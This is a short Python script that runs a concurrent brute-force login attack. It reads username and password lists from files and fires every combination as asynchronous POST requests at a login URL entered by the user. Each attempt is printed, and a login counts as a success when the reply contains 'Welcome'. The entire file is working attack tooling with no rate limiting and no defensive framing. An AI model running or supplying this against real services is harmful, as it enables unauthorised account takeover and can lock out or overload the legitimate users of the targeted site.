import asyncio
from aiohttp import ClientSession

async def attempt_login(url, username, password, session):
    """Asynchronously attempt to login with the given username and password."""
    print(f"Trying Username: {username}, Password: {password}")
    try:
        async with session.post(url, json={'username': username, 'password': password}) as response:
            response_text = await response.text()
            # Customize this check based on the application's response to a successful login
            if "Welcome" in response_text:  # Example: Check if 'Welcome' is in response
                print(f"Success! Username: {username}, Password: {password}")
                return True
            else:
                print(f"Failed attempt with Username: {username}, Password: {password}")
    except Exception as e:
        print(f"Error: {e}")
    return False

async def run_brute_force(url):
    async with ClientSession() as session:
        with open('usernames.txt', 'r') as usernames_file, open('passwords.txt', 'r') as passwords_file:
            usernames = usernames_file.read().splitlines()
            passwords = passwords_file.read().splitlines()

        tasks = []
        for username in usernames:
            for password in passwords:
                task = asyncio.create_task(attempt_login(url, username, password, session))
                tasks.append(task)

        await asyncio.gather(*tasks)

async def main():
    url = input("Enter the login URL: ")
    await run_brute_force(url)

if __name__ == "__main__":
    asyncio.run(main())
